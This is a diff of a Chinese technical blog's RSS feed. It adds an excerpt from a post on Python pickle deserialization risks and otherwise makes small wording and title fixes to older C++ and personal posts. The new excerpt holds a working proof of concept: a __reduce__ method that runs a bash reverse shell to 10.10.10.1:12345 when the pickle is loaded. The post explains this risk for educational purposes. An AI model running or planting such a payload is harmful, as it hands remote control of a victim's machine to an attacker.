@@ -6,7 +6,36 @@
     <description>Recent content in Posts on 蘭陵N梓記</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-CN</language>
-    <lastBuildDate>Sun, 07 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 13 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>飞哥讲代码24：从Python Pickle漏洞说起</title>
+      <link>http://lanlingzi.cn/post/technical/2021/0313_code/</link>
+      <pubDate>Sat, 13 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://lanlingzi.cn/post/technical/2021/0313_code/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;《泾溪》&amp;ndash; 杜荀鹤&lt;br&gt;
+泾溪石险人兢慎，终岁不闻倾覆人。&lt;br&gt;
+却是平流无石处，时时闻说有沉论。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
+&lt;p&gt;有次同事找我看个Python的安全问题。测试代码是这样的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;pickle&lt;/span&gt;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;os&lt;/span&gt;
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Test&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;object&lt;/span&gt;):
+    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;__reduce__&lt;/span&gt;(self):
+        cmd = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&amp;#34;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; (os.system,(cmd,))
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; __name__ == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+    test = Test()
+    bs = pickle.dumps(test)
+    pickle.loads(bs)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。&lt;/p&gt;
+&lt;p&gt;目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。&lt;/p&gt;</description>
+    </item>
+    
     <item>
       <title>飞哥讲代码23：C/C&#43;&#43;内存空洞</title>
       <link>http://lanlingzi.cn/post/technical/2021/0307_code/</link>
@@ -1396,8 +1425,8 @@ os.remove(file_name)
       
       <guid>http://lanlingzi.cn/post/thoughts/2019/0511_study/</guid>
       <description>&lt;h1 id=&#34;忽视的差距&#34;&gt;忽视的差距&lt;/h1&gt;
-&lt;p&gt;公司推崇工程师文化，提拔一些软件工程师作为标杆没有任何问题。事实上发现很难去标签化软件编码高手的特征。资深软件工程师和新手似乎看起来没啥区别，区别他们是异常困难，尤其这个群体中很多的人不愿意展现自己，他们可能藏在一个领域默默奉献着，不显山不露水。&lt;/p&gt;
-&lt;p&gt;软件开发中很多例行却看是平淡的活动，大家都能做到。以产品交付为中心的文化里，人人都是螺丝钉，往往忽然一个人的价值点，很少有人能愿意去了解甚至去分析新手与高手之间的差距。软件开发中专业性总容易被主管们忽视，也因此严重影响了软件工程师追求卓越的过程。曾经发生过可怕的高层观点：精英做架构，资深做设计，随便招个高中生编码就行了。试图把软件产品开发也做成像其它物理产品一样的流水线，这多么年来证明是错误的。&lt;/p&gt;</description>
+&lt;p&gt;事实上发现很难去标签化软件编码高手的特征。资深软件工程师和新手似乎看起来没啥区别，区别他们是异常困难，尤其这个群体中很多的人不愿意展现自己，他们可能藏在一个领域默默奉献着，不显山不露水。&lt;/p&gt;
+&lt;p&gt;软件开发中很多例行却看是平淡的活动，大家似乎都能做到。以产品交付为中心的文化里，人人都是螺丝钉，往往忽然一个人的价值点，很少有人能愿意去了解甚至去分析新手与高手之间的差距。软件开发中专业性总容易被主管们忽视，也因此严重影响了软件工程师追求卓越的过程。曾经发生过可怕的高层观点：精英做架构，资深做设计，随便招个高中生编码就行了。试图把软件产品开发也做成像其它物理产品一样的流水线，这多么年来证明是错误的。&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2162,8 +2191,8 @@ Open source relational database management system
       <pubDate>Sun, 31 Jan 2016 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/thoughts/2016/0131_unity_knowledge_action/</guid>
-      <description>&lt;p&gt;最近在走读团队的代码，有时实在是看不下去。不是因为他们的代码编写有很多Bugs，而是没有设计实现太复杂了。当面对众多的需求需要快速实现，没有几个人会去思考代码怎么写结构才更合理，而是在不断去搬砖垒需求。当我去咨询他们为什么要这样实现时，每个人能只能说出一，不知其二。即使自己写的代码，也不知道当初为什么这么实现。&lt;/p&gt;
-&lt;p&gt;同时，我们团队中不乏有各种兴趣小组。例如学习新的技术框架，交流设计模型，讨论重构技巧、性能优化经验。而实际在操作层面上，代码却正如前面所讲，有时真的不堪入目。由于这近在看王阳明传，突然想到我们没有&lt;code&gt;知行合一&lt;/code&gt;啊。&lt;/p&gt;</description>
+      <description>&lt;p&gt;最近在走读团队的代码，有时实在是看不下去。不是因为他们的代码编写有很多Bugs，而是没有设计实现太复杂了。当面对众多的需求需要快速实现，没有几个人会去思考代码怎么写结构才更合理，而是在不断去搬砖垒需求。当我去咨询他们为什么要这样实现时，每个人能只能说出其一，不知其二。即使自己写的代码，也不知道当初为什么这么实现。&lt;/p&gt;
+&lt;p&gt;同时，我们团队中不乏有各种兴趣小组。例如学习新的技术框架，交流设计模式，讨论重构技巧、性能优化经验。而实际在操作层面上，代码却正如前面所讲，有时真的不堪入目。正好这近在看王阳明传，突然想到我们没有&lt;code&gt;知行合一&lt;/code&gt;啊。&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2234,7 +2263,7 @@ Open source relational database management system
       
       <guid>http://lanlingzi.cn/post/stories/2016/0101_new_year/</guid>
       <description>&lt;p&gt;韶华易逝，往昔不再。时间已翻到2016年，在15年的12月份，忽然做了一个决定，注册了lanlingzi.cn这个域名，开始鼓励自己写写东西。原由是在15年的下半年，工作上做一个重大的调整，暮然发现自已写东西有时真让人费解。这个域名上已有的文章，是我之前在CSDN上一些记忆，以及自已电脑上留下的文档。虽然在公司也会写写技术博文，但那些更倾向于技术的细节与程序语言，对问题的思考与见解少了一些。&lt;/p&gt;
-&lt;p&gt;在16年的计划目标是每个月一到两篇，争取多写些有思想，有见解的干货。经过这几天的梳理，才有了这个网站。发现写东西是一个比较费时费脑力的事儿，甚至比写起代码来还难。苦于自己的文思，文笔，写完之后，有时连自己都看不下去，一堆的错别字，语句不通顺。有时，脑子中是飞快地转，好似有千言万语，下笔时却不知从何写起。&lt;/p&gt;</description>
+&lt;p&gt;在16年的计划目标是每个月一到两篇，争取多写些有思想，有见解的干货。经过这几天的梳理，才有了这个网站。写东西是一个比较费时费脑力的事儿，甚至比写代码来还难。苦于自己的文笔，写完之后，有时连自己都看不下去，一堆的错别字，语句不通顺。有时，脑子中是飞快地转，好似有千言万语，下笔时却不知从何写起。&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2244,7 +2273,7 @@ Open source relational database management system
       
       <guid>http://lanlingzi.cn/post/stories/2015/1231_debian_ian_die/</guid>
       <description>&lt;p&gt;&lt;img src=&#34;http://img.article.pchome.net/00/37/34/79/pic_lib/s960x639/Operating_Systems_015s960x639.JPG&#34; alt=&#34;Debian&#34;&gt;&lt;/p&gt;
-&lt;p&gt;万万没想到，在即将迎来2016年时，微信，科技新闻中都在传&lt;a href=&#34;http://www.leiphone.com/news/201512/Rnum0JX3yn5sxU3l.html?t=1451547845009&#34;&gt;“Debian创始人Ian Murdock离奇死亡，曾发推表示要自杀”&lt;/a&gt;。作为一个对Debian系Linux的忠实爱好者，有种莫名的感伤，对大神的离去表示衷心的哀悼。&lt;/p&gt;</description>
+&lt;p&gt;万万没想到，在即将迎来2016年时，微信科技新闻中都在转发 &lt;a href=&#34;http://www.leiphone.com/news/201512/Rnum0JX3yn5sxU3l.html?t=1451547845009&#34;&gt;“Debian创始人Ian Murdock离奇死亡，曾发推表示要自杀”&lt;/a&gt;。作为一个对Debian系Linux的忠实爱好者，有种莫名的感伤，对大神的离去表示衷心的哀悼。&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2287,7 +2316,7 @@ Open source relational database management system
       
       <guid>http://lanlingzi.cn/post/stories/2015/0926_chengdu/</guid>
       <description>&lt;p&gt;风味十足的四川话，风姿卓然的川妹子，麻辣干香的风味菜，是我是对成都的初步映象。有“天府之国”、“蜀中苏杭”美誉的成都蓉城，在小说与故事中都有耳闻，向往已久。在上高中时，就想报考虑成都的高校，无奈分数不够高，被调济到北方。这次作为招聘技术面试官出差来了一趟成都，了却了一桩十几年前的心愿。&lt;/p&gt;
-&lt;p&gt;作为面试官，我们必须西装革履，多年的散慢习惯，反而不太适当。我们下榻的酒店，环境与生活还算不错，但是地理位置有点偏，即使晚上空闲下来，也难以感受到成都的气息。招聘其实是个苦差事，连续二天集中的面试时间，已让我有些疲倦。第三天中午面试完最后几个之后，下午忽然空闲下来。秘书说下午面试预约已结束，我们几个来自深圳的同事可以去成都逛逛。&lt;/p&gt;</description>
+&lt;p&gt;作为面试官，我们必须西装革履，多年的散慢习惯，反而不太适合。我们下榻的酒店，环境与生活还算不错，但是地理位置有点偏，即使晚上空闲下来，也难以感受到成都的气息。招聘其实是个苦差事，连续二天集中的面试时间，已让我有些疲倦。第三天中午面试完最后几个之后，下午忽然空闲下来。秘书说下午面试预约已结束，我们几个来自深圳的同事可以去成都逛逛。&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2572,7 +2601,7 @@ Open source relational database management system
       <pubDate>Sun, 06 Sep 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/stories/2009/0906_grandpa/</guid>
-      <description>&lt;p&gt;昨天我去一了趟广州小叔那，去看我爷爷。岁月催人老，一晃我爷爷马上80岁了。我差不多每一年才与他见面一次，主要是回家过年时。每次见到他，都感觉他越来越苍老，不过今年他的身体还不错，希望他能健康百岁。&lt;/p&gt;</description>
+      <description>&lt;p&gt;昨天我去一了趟广州小叔那，看我爷爷。岁月催人老，一晃我爷爷马上80岁了。我差不多每一年才与他见面一次，主要是回家过年时。每次见到他，都感觉他越来越苍老，不过今年他的身体还不错，希望他能健康百岁。&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -2597,24 +2626,20 @@ Open source relational database management system
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之名字空间namespace</title>
+      <title>c&#43;&#43;技巧之名字空间namespace</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_namespace_usage/</link>
       <pubDate>Mon, 13 Jul 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_namespace_usage/</guid>
       <description>&lt;p&gt;C开发人员会经常使用&lt;code&gt;#define&lt;/code&gt;即宏来声明常量，但宏却是全局的，对大的工程来说是很难维护，经常是导致名字冲突。还好，C++给我们带来了&lt;code&gt;namespace&lt;/code&gt;名字空间。它的使用如下，名字空间可以把一组逻辑分组，同时名字空间也是一种作用域。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;namespace outspname  
-{   
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;namespace outspname {   
    const int CVAR1 = 1;  
    const char* const CVAR2 = &amp;#34;33333&amp;#34;;  
    void test();  
 
-   namespace inspname  
-   {  
+   namespace inspname {  
       enum { A, B, C};  
-      class Klass  
-      {  
-      };  
+      class Klass {};  
    }  
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
@@ -2626,7 +2651,8 @@ Open source relational database management system
       <pubDate>Fri, 03 Jul 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/oo_design_principle/</guid>
-      <description>&lt;p&gt;如何同时提高一个软件系统的可维护性和可复用性是面向对象的设计要解决的核心问题。&lt;/p&gt;
+      <description>&lt;h2 id=&#34;为什么要有设计&#34;&gt;为什么要有设计&lt;/h2&gt;
+&lt;p&gt;如何同时提高一个软件系统的可维护性和可复用性是面向对象的设计要解决的核心问题。&lt;/p&gt;
 &lt;p&gt;导致一个软件设计的可维护性较低，也就是说会随着性能要求的变化而“腐烂”的真正原因有四个：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;过于僵硬&lt;/li&gt;
@@ -2643,32 +2669,35 @@ Open source relational database management system
     </item>
     
     <item>
-      <title>[C&#43;&#43;] STL容器中erase方法的不同陷阱</title>
+      <title>c&#43;&#43; STL容器erase方法的不同陷阱</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_erase_fault/</link>
       <pubDate>Wed, 01 Jul 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_erase_fault/</guid>
-      <description>&lt;p&gt;&lt;code&gt;STL&lt;/code&gt;中的容器都有&lt;code&gt;erase&lt;/code&gt;方法，容器的存储分为顺序存储(如&lt;code&gt;vector&lt;/code&gt;)与链式存储(如&lt;code&gt;list,map&lt;/code&gt;)。先以&lt;code&gt;map&lt;/code&gt;为例:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;typedef std::map&amp;lt;std::string, std::string&amp;gt; TStrMap;  
-typedef TStrMap::iterator TStrMapIter;  
+      <description>&lt;h2 id=&#34;陷阱&#34;&gt;陷阱&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;STL&lt;/code&gt;中的容器都有&lt;code&gt;erase&lt;/code&gt;方法，容器的存储分为顺序存储(如&lt;code&gt;vector&lt;/code&gt;)与链式存储(如&lt;code&gt;list,map&lt;/code&gt;)。先以&lt;code&gt;map&lt;/code&gt;为例:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;typedef&lt;/span&gt; std::map&amp;lt;std::string, std::string&amp;gt; TStrMap;  
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;typedef&lt;/span&gt; TStrMap::iterator TStrMapIter;  
+
 TStrMap strmap;  
-TStrMapIter iter = strmap.find(&amp;#34;somekey&amp;#34;);  
+TStrMapIter iter = strmap.find(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;somekey&amp;#34;&lt;/span&gt;);  
 strmap.erase(iter);
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样使用&lt;code&gt;erase&lt;/code&gt;方法没有任何问题，删除一个单结节之后，&lt;code&gt;stl&lt;/code&gt;中的&lt;code&gt;iterator&lt;/code&gt;都是与其中的数据元素关联的，关联的元素删除之后，&lt;code&gt;ite&lt;/code&gt;r已就失效，&lt;code&gt;iter&lt;/code&gt;理解为指向元素的指针，那删除之后可以简单理解为已是一个野指针。&lt;/p&gt;</description>
     </item>
     
     <item>
-      <title>C&#43;&#43;的仿函数与动态语言的闭包</title>
+      <title>c&#43;&#43;的仿函数与动态语言的闭包</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_closure_pkg/</link>
       <pubDate>Mon, 29 Jun 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_closure_pkg/</guid>
-      <description>&lt;p&gt;什么是闭包，我们先来用&lt;code&gt;ruby&lt;/code&gt;看个例子：&lt;/p&gt;
+      <description>&lt;h2 id=&#34;闭包&#34;&gt;闭包&lt;/h2&gt;
+&lt;p&gt;什么是闭包，我们先来用&lt;code&gt;ruby&lt;/code&gt;看个例子：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;sum = 0  
 10.times{|n| sum += n}   
 print sum
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中&lt;code&gt;{}&lt;/code&gt;就是闭包的内容，代码看起来是不是很清爽与简单。&lt;/p&gt;
-&lt;p&gt;我们还来看看&lt;code&gt;Python&lt;/code&gt;写的闭包：&lt;/p&gt;
+&lt;p&gt;我们再来看看&lt;code&gt;Python&lt;/code&gt;写的闭包：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;def addx(x):      
     return lambda y: x + y  
 add8 = addx(8)  
@@ -2677,25 +2706,27 @@ print add8(100)
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之栈变量的析构应用</title>
+      <title>c&#43;&#43;技巧之栈变量的析构应用</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_stack_usage/</link>
       <pubDate>Thu, 25 Jun 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_stack_usage/</guid>
-      <description>&lt;p&gt;栈变量有一个好处，就是它退栈时会自动析构，并且在栈上对象生成比在堆上分配效率高很多。但每个线程的栈空间是有限的(创建线程时可以设置)，所以一般的临时小对象都会在栈上分配。&lt;/p&gt;</description>
+      <description>&lt;h2 id=&#34;栈变量&#34;&gt;栈变量&lt;/h2&gt;
+&lt;p&gt;栈变量有一个好处，就是它退栈时会自动析构，并且在栈上对象生成比在堆上分配效率高很多。但每个线程的栈空间是有限的(创建线程时可以设置)，所以一般的临时小对象都会在栈上分配。&lt;/p&gt;</description>
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之operator操作符</title>
+      <title>c&#43;&#43;技巧之operator操作符</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_operator/</link>
       <pubDate>Wed, 24 Jun 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_operator/</guid>
-      <description>&lt;p&gt;这篇博文是以前很久写的，贴在我的早期一个blog中，今天google一下，发现还真有不少人转载，可惜并不注明出处。那时觉得&lt;code&gt;operator&lt;/code&gt;比较好玩。C++有时它的确是个耐玩的东东。&lt;code&gt;operator&lt;/code&gt;它有两种用法，一种是&lt;code&gt;operator overloading&lt;/code&gt;（操作符重载），一种是&lt;code&gt;operator casting&lt;/code&gt;（操作隐式转换）。&lt;/p&gt;</description>
+      <description>&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
+&lt;p&gt;这篇博文是以前很久写的，贴在我的早期一个blog中，今天google一下，发现还真有不少人转载，可惜并不注明出处。那时觉得&lt;code&gt;operator&lt;/code&gt;比较好玩。C++有时它的确是个耐玩的东东。&lt;code&gt;operator&lt;/code&gt;它有两种用法，一种是&lt;code&gt;operator overloading&lt;/code&gt;（操作符重载），一种是&lt;code&gt;operator casting&lt;/code&gt;（操作隐式转换）。&lt;/p&gt;</description>
     </item>
     
     <item>
-      <title>[c&#43;&#43;]自己实现的queue</title>
+      <title>c&#43;&#43;实现的queue</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_self_impl_queue/</link>
       <pubDate>Sat, 20 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2704,7 +2735,7 @@ print add8(100)
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之断言Assert</title>
+      <title>c&#43;&#43;技巧之断言Assert</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_static_assert/</link>
       <pubDate>Sun, 14 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2713,7 +2744,7 @@ print add8(100)
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之宏Macro应用</title>
+      <title>c&#43;&#43;技巧之宏Macro应用</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_macro_rule/</link>
       <pubDate>Fri, 12 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2735,7 +2766,7 @@ MAX(3,4)使用没有问题，但MAX(3+4, 4)却有问题，因为宏的参数仅�
     </item>
     
     <item>
-      <title>[c&#43;&#43;]自己实现的stack</title>
+      <title>c&#43;&#43;实现的stack</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_self_impl_stack/</link>
       <pubDate>Thu, 11 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2744,7 +2775,7 @@ MAX(3,4)使用没有问题，但MAX(3+4, 4)却有问题，因为宏的参数仅�
     </item>
     
     <item>
-      <title>用C&#43;&#43;模板来展示new与delete操作符原理</title>
+      <title>用c&#43;&#43;模板来展示new与delete操作符原理</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_new_delete/</link>
       <pubDate>Mon, 08 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2759,7 +2790,7 @@ MAX(3,4)使用没有问题，但MAX(3+4, 4)却有问题，因为宏的参数仅�
     </item>
     
     <item>
-      <title>[c&#43;&#43;]常见的几个排序算法</title>
+      <title>c&#43;&#43;常见的几个排序算法</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_aglos/</link>
       <pubDate>Sun, 07 Jun 2009 00:00:00 +0000</pubDate>
       
